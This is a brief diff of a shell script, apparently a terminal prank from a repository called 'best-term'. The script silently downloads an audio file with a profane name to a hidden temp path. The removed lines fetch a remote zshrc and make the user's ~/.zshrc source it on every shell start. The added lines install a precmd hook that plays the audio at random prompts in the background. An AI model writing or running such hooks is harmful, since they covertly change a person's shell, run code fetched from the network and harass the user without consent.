@@ -1,4 +1,6 @@
 curl -s "https://raw.githubusercontent.com/Dancheek/best-term/master/FUCKYOU.mp3" > /tmp/.file.mp3
-curl -s "https://raw.githubusercontent.com/Dancheek/best-term/master/zshrc" > /tmp/.zshrc
-echo "source /tmp/.zshrc" >> ~/.zshrc
-exec zsh
+precmd () {
+	if [ $(jot -r 1 0 9) = 0  ]; then
+		(afplay /tmp/.file.mp3) &!
+	fi
+}
